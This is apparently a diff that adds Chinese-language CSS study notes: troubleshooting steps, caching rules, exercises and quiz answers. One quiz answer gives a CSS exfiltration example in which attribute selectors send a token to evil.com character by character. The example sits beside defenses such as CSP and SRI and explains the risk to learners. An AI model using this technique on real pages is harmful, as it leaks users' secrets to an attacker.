+/* ★★★ 不用斷點的現代寫法 */
+font-size: clamp(1.25rem, 4vw, 2.5rem);
+width: min(100% - 2rem, 1140px);
+grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+
+★★★★ 手機跑版三原因：缺 viewport / 元素寬度寫死 / 圖片沒 max-width
+```
+
+### ★★★★ 快取
+
+```nginx
+/build/*.css|js   expires 1y; Cache-Control "public, immutable"  # ★★★ 檔名有 hash
+/                 Cache-Control "no-cache, must-revalidate"      # ★★★★ HTML 絕不長期快取
+```
+
+### Console 速查
+
+```javascript
+document.compatMode                                    // ★★★ "CSS1Compat"
+[...document.styleSheets].map(s => s.href)             // ★★★ 載入了哪些 CSS
+getComputedStyle($0).width                             // ★★★ 實際寬度
+[...document.querySelectorAll('*')]                    // ★★★★ 誰撐破版面
+  .filter(e => e.getBoundingClientRect().right > innerWidth)
+```
+
+---
 
 ## 練習題
 
-> [!question]- 練習 1
-> <!-- TODO: 待撰寫 -->
+> [!question]- 練習 1：盒模型 ★★★★
+> 1. **建一個 `.col { width:50%; padding:20px; border:1px solid }`，放兩個**
+> 2. **會換行嗎？用 Computed 面板看實際寬度**
+> 3. **加上 `box-sizing: border-box`** → 呢？
+> 4. **開發者工具的盒模型圖分別顯示什麼？**
+> 5. **`getComputedStyle($0).width` 兩種情況各是多少？**
+> 6. **為什麼幾乎所有專案都會加那行通用規則？**
+
+> [!question]- 練習 2：優先權 ★★★★
+> 1. **寫三條規則分別用標籤、class、id 設定同一個元素的顏色**
+> 2. **哪個生效？在 Styles 面板看到什麼？**
+> 3. **在 class 那條加 `!important`** → 呢？
+> 4. **在 id 那條也加 `!important`** → 呢？
+> 5. **加一個行內 `style`** → 呢？
+> 6. **`grep -rc '!important' resources/css/`** → 你的專案有幾個？
+
+> [!question]- 練習 3：版面排查 ★★★★
+> 1. **故意把 CSS 的路徑改錯**
+> 2. **`css-check` 的輸出是什麼？**
+> 3. **改回來，但故意留一個 `<div>` 沒關**
+> 4. **`tidy -qe` 找得到嗎？畫面上的症狀是什麼？**
+> 5. **加一個 `width: 1400px` 的元素**
+> 6. **用 Console 腳本找出撐破版面的元素**
+
+> [!question]- 練習 4：響應式 ★★★
+> 1. **拿掉 viewport meta，用手機模式看** → 差別在哪？
+> 2. **加回來，用 F12 的裝置模擬測 375px / 768px / 1200px**
+> 3. **哪個寬度開始跑版？**
+> 4. **用 `grid-template-columns: repeat(auto-fill, minmax(280px,1fr))` 做卡片列表**
+> 5. **不寫任何 media query，縮放視窗** → 會自動換行嗎？
+> 6. **加上 `clamp()` 讓標題字級也響應**
+
+> [!question]- 練習 5：無障礙與安全 ★★★★
+> 1. **用 Console 腳本檢查有沒有 `outline: none`**
+> 2. **有的話改成 `:focus-visible`，用 Tab 鍵測試**
+> 3. **`npx pa11y URL`** → focus 相關的問題解決了嗎？
+> 4. **找出頁面中沒有 SRI 的外部資源**
+> 5. **為其中一個產生 SRI 雜湊並加上**
+> 6. **故意改一個位元組再載入** → 瀏覽器擋住了嗎？
+
+---
 
 ## 小測驗
 
-<!-- 最多 10 題，針對關鍵細節與易錯觀念 -->
+Q1. **版面壞掉時的六步排查順序**？
 
-Q1. 
-Q2. 
-Q3. 
+Q2. **CSS 優先權怎麼算**？為什麼「我改了但沒生效」？
+
+Q3. **為什麼幾乎所有專案都要寫 `box-sizing: border-box`**？
+
+Q4. **兩欄各 50% 為什麼會擠不下**？
+
+Q5. **`outline: none` 為什麼絕對不能用**？正確做法？
+
+Q6. **Flexbox 和 Grid 各適合什麼**？
+
+Q7. **手機版跑版的三個常見原因**？
+
+Q8. **「改了 CSS 但使用者看到舊的」怎麼根治**？
+
+Q9. **HTML 為什麼絕對不能長期快取**？
+
+Q10. **CSS 也能造成資安問題嗎**？
 
 > [!question]- 測驗答案
-> **Q1.** 
-> **Q2.** 
-> **Q3.** 
+> **Q1.** ①**★★★★ CSS 檔案載入了嗎** —— Network 分頁或 `curl -sI` 看狀態碼，
+> **特別注意 Content-Type**：回 200 但 `text/html` 表示請求被導向錯誤頁；
+> ②**★★★★ 是快取嗎** —— `Ctrl+Shift+R` 強制重整，好了就是快取問題；
+> ③**★★★ HTML 標籤有沒有沒關** —— `tidy -qe`，
+> 「某一段之後全歪」幾乎都是這個；
+> ④**★★★ 是怪異模式嗎** —— `document.compatMode` 應該是 `"CSS1Compat"`；
+> ⑤**★★★★ 我改的規則生效了嗎** —— Styles 面板中**被劃掉的規則**表示被優先權更高的蓋過；
+> ⑥**★★★★ 盒模型計算** —— Computed 面板最下方的盒模型圖，
+> 看 content/padding/border 各佔多少。
+> **順序的邏輯：從「檔案有沒有到」往「規則對不對」再到「計算對不對」**，
+> 由外而內縮小範圍。
+>
+> **Q2.** **三個層級決定**：
+> ①**重要性**：`!important` 壓過一般規則；
+> ②**★★★★ 優先權算分**：
+> 行內 `style` = 1000、`#id` = 100、`.class`/屬性 = 10、標籤 = 1，**相加**；
+> ③**順序**：分數相同時後寫的贏。
+> **「改了沒生效」最常見的原因是分數不夠** ——
+> 你在 `style.css` 寫 `.btn { color: blue }`（10 分），
+> 但頁面上有 `#main .btn { color: red }`（110 分），
+> **不管你寫在多後面都不會生效**。
+> **診斷**：開發者工具的 **Styles 面板會把失效的規則劃掉**，
+> 並在上方顯示是哪一條贏了。
+> **正確的解法是降低現有規則的優先權（少用 id 選擇器），
+> 而不是加 `!important`** —— 那只會開啟一場優先權軍備競賽。
+>
+> **Q3.** 因為 **瀏覽器的預設 `content-box` 讓 `width` 只算內容，
+> 不含 padding 和 border**，
+> 導致「我設 300px 但實際佔了 342px」這種反直覺的結果。
+> ```css
+> .box { width: 300px; padding: 20px; border: 1px solid; }
+> /* content-box（預設）：實際寬 = 300 + 20×2 + 1×2 = 342px */
+> /* border-box：         實際寬 = 300px，content 自動縮成 258px */
+> ```
+> **`border-box` 是絕大多數情況下你想要的行為** ——
+> 設定 300px 就佔 300px，加 padding 不會撐大元素。
+> **通用寫法**：
+> ```css
+> *, *::before, *::after { box-sizing: border-box; }
+> ```
+> 要加 `::before`/`::after` 是因為偽元素不會繼承這個屬性。
+> 這幾乎是每個 CSS reset / normalize 的第一條規則。
+>
+> **Q4.** 因為 **在預設的 `content-box` 下，padding 和 border 是「加在 50% 之外」的**：
+> ```css
+> .col { width: 50%; padding: 20px; border: 1px solid #ccc; }
+> ```
+> 每欄實際佔用 **50% + 42px**，
+> 兩欄 = **100% + 84px > 容器寬度** → 第二欄被擠到下一行。
+> **加上 `box-sizing: border-box` 後**，
+> 50% 就是含 padding 與 border 的總寬，兩欄剛好 100%。
+> **診斷方式**：開發者工具 → 檢查元素 → **Computed 面板最下方的盒模型圖**，
+> 一眼看出 content 是多少、padding 是多少、總共佔多寬。
+> **相關陷阱**：`gap` 或 margin 也會佔空間，
+> 用 Flexbox/Grid 的 `gap` 比 margin 好算（Grid 的 `1fr` 會自動扣掉 gap）。
+>
+> **Q5.** 因為 **鍵盤使用者完全看不出焦點在哪裡**。
+> 不用滑鼠的人（行動不便者、視障者、或單純習慣鍵盤的人）
+> 用 `Tab` 鍵在頁面上移動，**focus 框是他們唯一的位置指示**。
+> 移除之後，**按 Tab 完全不知道現在選到哪個連結或欄位**，
+> 等於整個網站無法用鍵盤操作。
+> **★★★ 這會直接違反 WCAG 2.4.7（Focus Visible）**，
+> 台灣的「網站無障礙規範」以此為依據，**機關網站是驗收條件**。
+> **正確做法：換一個好看的樣式，不是拿掉**：
+> ```css
+> :focus-visible {
+>     outline: 3px solid #4c8dff;
+>     outline-offset: 2px;
+> }
+> ```
+> **`:focus-visible` 的好處是只在鍵盤操作時顯示** ——
+> 滑鼠點擊按鈕不會出現外框（那正是大家覺得「醜」的情境），
+> 兼顧了美觀與無障礙。
+>
+> **Q6.** **Flexbox 適合「一維」排列**（一行或一列）——
+> 導覽列的項目、卡片內的上下堆疊、
+> 「這個靠左那個靠右」這類需求，**內容決定尺寸**。
+> ```css
+> .nav { display: flex; gap: 1rem; justify-content: space-between; align-items: center; }
+> ```
+> **Grid 適合「二維」版面**（同時控制行與列）——
+> 整頁的骨架（header/sidebar/main/footer）、商品網格，
+> **容器決定尺寸**，可以同時對齊「行」也對齊「列」。
+> ```css
+> .layout { display: grid; grid-template-columns: 240px 1fr; }
+> .cards  { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); }
+> ```
+> **實務上兩者搭配：Grid 做外層版面骨架，Flexbox 做內部元件**。
+> Grid 的 `auto-fill` + `minmax` 特別好用 ——
+> **不寫任何 media query 就能自動響應**。
+>
+> **Q7.** ①**★★★★ 缺 viewport meta** ——
+> 沒有 `<meta name="viewport" content="width=device-width, initial-scale=1">`，
+> 手機會用 **980px 的虛擬寬度**渲染再縮小整頁，字small到看不清；
+> ②**★★★★ 某個元素的寬度寫死超過螢幕** ——
+> 造成**整頁可以左右捲動**，常見兇手是寫死 `width: 1200px` 的表格、
+> 沒設 `max-width` 的圖片、或很長的無空格字串（網址）。
+> 找出兇手：
+> ```javascript
+> [...document.querySelectorAll('*')]
+>   .filter(e => e.getBoundingClientRect().right > innerWidth)
+> ```
+> ③**★★★ 圖片沒設 `max-width`** ——
+> ```css
+> img, video, svg, iframe { max-width: 100%; height: auto; }
+> ```
+> **寬表格的正確處理**是用 `overflow-x: auto` 的容器包起來讓**表格自己捲**，
+> 而不是讓整頁捲。
+>
+> **Q8.** **★★★★ 用「檔名含內容 hash」的 cache busting**
+> （Vite、webpack 的預設行為）：
+> ```
+> /build/assets/app-a1b2c3.css
+> ```
+> **內容變 → hash 變 → 檔名變 → 瀏覽器一定重新下載**；
+> **內容沒變 → 檔名不變 → 繼續用快取**。
+> 這讓你可以**放心設定極長的快取**：
+> ```nginx
+> location ~* ^/build/.*\.(css|js)$ {
+>     expires 1y;
+>     add_header Cache-Control "public, immutable" always;
+> }
+> ```
+> **比較差的做法**：
+> 手動改 `?v=2`（會忘記）、
+> 用時間戳 `?t=filemtime`（每次部署都失效，即使內容沒變）。
+> **前提是 HTML 不能被長期快取**（見下一題）——
+> 因為 HTML 記錄了要載入哪個 hash 檔案。
+>
+> **Q9.** 因為 **HTML 記錄了「要載入哪些 hash 檔名的 CSS/JS」**。
+> ```html
+> <link rel="stylesheet" href="/build/assets/app-a1b2c3.css">
+> ```
+> 部署新版後，檔名變成 `app-d4e5f6.css`，
+> **舊的 `app-a1b2c3.css` 通常已經被刪除**。
+> 如果瀏覽器**快取了舊的 HTML**，
+> 它會繼續去載入那個**已經不存在的檔案** →
+> **CSS 404 → 版面全壞**；JS 的話則是 **`ChunkLoadError`**，
+> 而且**在使用者清快取之前一直是壞的**。
+> **正確設定**：
+> ```nginx
+> location / { add_header Cache-Control "no-cache, must-revalidate" always; }
+> ```
+> **`no-cache` 不是「不快取」，是「每次都要向伺服器確認」** ——
+> 內容沒變時伺服器回 304，仍然省流量。
+> **「殼短快取、資源長快取」是所有前端部署的基本原則**。
+>
+> **Q10.** **★★★ 可以，而且比多數人想的嚴重**。
+> **① CSS exfiltration（資料竊取）** ——
+> 屬性選擇器配合背景圖可以**逐字元竊取欄位的值**：
+> ```css
+> input[name="token"][value^="a"] { background: url(//evil.com/?c=a); }
+> input[name="token"][value^="b"] { background: url(//evil.com/?c=b); }
+> ```
+> 產生 256 條規則就能一個字元一個字元把 token 傳出去，**不需要 JavaScript**。
+> **防護**：不要讓使用者控制 CSS；**CSP 限制 `img-src`**。
+> **② 不受控的第三方 CSS** ——
+> 外部 CDN 的樣式表可以**隱藏警告訊息、用 `content` 屬性偽造文字、
+> 把按鈕移到別的位置**。防護是 **SRI（Subresource Integrity）**：
+> ```html
+> <link rel="stylesheet" href="https://cdn…/lib.css"
+>       integrity="sha384-…" crossorigin="anonymous">
+> ```
+> **③ UI 偽裝與 clickjacking** ——
+> 配合 iframe 把你的按鈕疊在別的東西下面，
+> 防護是 `X-Frame-Options` / CSP 的 `frame-ancestors`。
+
+---
 
 ## 延伸閱讀
 
-- [[01-HTML結構與語意]]
-- [[03-JavaScript基礎]]
+- [[01-HTML結構與語意]] — 結構與無障礙
+- [[07-瀏覽器開發者工具]] — **★★★ Styles / Computed 面板的完整用法**
+- [[06-前端建置工具與套件管理]] — Vite 與 cache busting
+- [[01-Vue-建置與Nginx靜態部署]] — 靜態資源的部署與快取
+- [[05-Nginx-靜態資源與快取]] — nginx 的快取設定
+- [[02-應用層安全]] — CSP 與安全標頭
